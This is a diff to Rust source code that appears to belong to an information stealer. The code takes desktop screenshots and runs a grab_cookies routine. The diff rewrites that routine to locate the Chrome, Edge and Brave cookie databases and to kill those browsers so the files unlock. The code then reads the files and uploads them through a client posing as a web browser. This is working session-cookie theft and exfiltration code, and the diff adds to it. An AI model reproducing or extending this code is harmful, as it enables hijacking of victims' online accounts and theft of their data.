@@ -4,7 +4,9 @@ use screenshots::Screen;
 use std::ffi::OsString;
 use std::fs;
 use std::io::Cursor;
-use std::path::{self, PathBuf};
+use std::path::PathBuf;
+
+use crate::utils::process::find_and_kill_process;
 
 pub fn get_host() -> OsString {
     return gethostname::gethostname();
@@ -77,60 +79,38 @@ pub async fn screenshot_desktop_and_upload() -> Result<Vec<String>, Box<dyn std:
 }
 
 pub async fn grab_cookies() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    let mut paths = Vec::new();
     let mut urls = Vec::new();
 
-    let chrome: PathBuf = [
-        r"%LOCALAPPDATA%",
-        r"\Google",
-        r"\Chrome",
-        r"\User Data",
-        r"\Default",
-        r"\Network",
-        r"\Cookies",
-    ]
-    .iter()
-    .collect();
+    let chrome: PathBuf = "Google/Chrome/User Data/Default/Network/Cookies".into();
+    let edge: PathBuf = "Microsoft/Edge/User Data/Default/Network/Cookies".into();
+    let brave: PathBuf = "BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies".into();
 
-    let edge: PathBuf = [
-        r"%LOCALAPPDATA%",
-        r"\Microsoft",
-        r"\Edge",
-        r"\User Data",
-        r"\Default",
-        r"\Network",
-        r"\Cookies",
-    ]
-    .iter()
-    .collect();
+    let mut full_paths: Vec<PathBuf> = Vec::new();
 
-    let brave: PathBuf = [
-        r"%LOCALAPPDATA%",
-        r"\BraveSoftware",
-        r"\Brave-Browser",
-        r"\User Data",
-        r"\Default",
-        r"\Network",
-        r"\Cookies",
-    ]
-    .iter()
-    .collect();
+    if let Some(base) = dirs::data_local_dir() {
+        let p = vec![chrome, edge, brave];
 
-    paths.push(chrome);
-    paths.push(edge);
-    paths.push(brave);
+        for path in p {
+            full_paths.push(base.join(path));
+        }
+    }
+
+    let processes = vec!["chrome.exe", "msedge.exe", "brave.exe"];
+
+    for p in processes {
+        find_and_kill_process(p);
+    }
 
     let client = reqwest::Client::builder()
         .http1_only()
         .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         .build()?;
 
-    for path in &paths {
+    for path in &full_paths {
         if path.exists() {
-            let cookies = path
-                .file_stem()
-                .and_then(|s| s.to_str())
-                .unwrap_or("Cookies");
+            println!("{:?} exists", path);
+
+            let cookies = path.file_name().unwrap().to_string_lossy();
 
             let file_bytes = fs::read(&path)?;
 
@@ -155,6 +135,8 @@ pub async fn grab_cookies() -> Result<Vec<String>, Box<dyn std::error::Error>> {
             } else {
                 return Err(format!("Upload failed: {} - {}", status, text).into());
             }
+        } else {
+            continue;
         }
     }
 
